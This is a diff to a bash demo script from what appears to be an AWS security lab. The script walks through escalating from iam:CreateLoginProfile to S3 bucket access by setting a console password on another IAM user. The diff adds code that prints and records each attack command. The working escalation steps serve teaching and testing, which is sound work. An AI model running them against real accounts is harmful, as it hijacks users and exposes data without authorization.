@@ -3,13 +3,33 @@
 # Demo script for iam:CreateLoginProfile privilege escalation to S3 bucket access
 # This script demonstrates how a user with CreateLoginProfile permission can escalate to S3 bucket access
 
-set -e
+
+# Disable AWS CLI paging
+export AWS_PAGER=""
 
 # Colors for output
 RED='\033[0;31m'
 GREEN='\033[0;32m'
 YELLOW='\033[1;33m'
 NC='\033[0m' # No Color
+
+# Dim color for command display
+DIM='\033[2m'
+CYAN='\033[0;36m'
+
+# Track attack commands for summary
+ATTACK_COMMANDS=()
+
+# Display a command before executing it
+show_cmd() {
+    echo -e "${DIM}\$ $*${NC}"
+}
+
+# Display AND record an attack command
+show_attack_cmd() {
+    echo -e "\n${CYAN}\$ $*${NC}"
+    ATTACK_COMMANDS+=("$*")
+}
 
 # Configuration
 STARTING_USER="pl-prod-iam-004-bucket-starting-user"
@@ -58,6 +78,7 @@ echo -e "${GREEN}✓ Successfully extracted and configured credentials${NC}\n"
 
 # Step 2: Verify starting user identity
 echo -e "${YELLOW}Step 2: Verifying identity as starting user${NC}"
+show_cmd aws sts get-caller-identity --query 'Arn' --output text
 CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $CURRENT_USER"
 
@@ -70,6 +91,7 @@ echo -e "${GREEN}✓ Verified starting user identity${NC}\n"
 
 # Step 3: Get account ID
 echo -e "${YELLOW}Step 3: Getting account ID${NC}"
+show_cmd aws sts get-caller-identity --query 'Account' --output text
 ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Account ID: $ACCOUNT_ID"
 echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
@@ -100,6 +122,7 @@ echo -e "${GREEN}✓ Identified target bucket${NC}\n"
 echo -e "${YELLOW}Step 5: Checking if hop1 user has a login profile${NC}"
 echo "Checking for existing login profile for user: $HOP1_USER"
 
+show_cmd aws iam get-login-profile --user-name $HOP1_USER
 if aws iam get-login-profile --user-name $HOP1_USER &> /dev/null; then
     echo -e "${RED}⚠ Login profile already exists for $HOP1_USER${NC}"
     echo "Please run ./cleanup_attack.sh first to remove the existing login profile"
@@ -114,6 +137,7 @@ echo -e "${YELLOW}Step 6: Verifying we don't have S3 bucket access yet${NC}"
 echo "Target bucket: $TARGET_BUCKET"
 echo "Attempting to list bucket contents (should fail)..."
 
+show_cmd aws s3 ls s3://$TARGET_BUCKET
 if aws s3 ls s3://$TARGET_BUCKET &> /dev/null; then
     echo -e "${RED}⚠ Unexpectedly have bucket access already${NC}"
 else
@@ -126,6 +150,7 @@ echo -e "${YELLOW}Step 7: Creating login profile for hop1 user${NC}"
 echo "Creating console password for user: $HOP1_USER"
 echo "Password: $PASSWORD"
 
+show_attack_cmd aws iam create-login-profile --user-name $HOP1_USER --password "$PASSWORD" --no-password-reset-required
 aws iam create-login-profile \
     --user-name $HOP1_USER \
     --password "$PASSWORD" \
@@ -161,6 +186,15 @@ echo ""
 echo -e "${YELLOW}Attack Path:${NC}"
 echo -e "  $STARTING_USER → (CreateLoginProfile) → $HOP1_USER → Console Login → S3 Bucket ($TARGET_BUCKET)"
 echo ""
+
+if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
+    echo -e "${YELLOW}Attack Commands:${NC}"
+    for cmd in "${ATTACK_COMMANDS[@]}"; do
+        echo -e "  ${CYAN}\$ ${cmd}${NC}"
+    done
+fi
+echo ""
+
 echo -e "${GREEN}Console Login Information:${NC}"
 CONSOLE_URL="https://${ACCOUNT_ID}.signin.aws.amazon.com/console"
 echo -e "  URL: ${YELLOW}$CONSOLE_URL${NC}"
@@ -169,3 +203,6 @@ echo -e "  Password: ${YELLOW}$PASSWORD${NC}"
 echo ""
 echo -e "${RED}IMPORTANT: Run cleanup_attack.sh to delete the login profile${NC}"
 echo ""
+
+# Mark demo as active for plabs tracking
+touch "$(dirname "$0")/.demo_active"
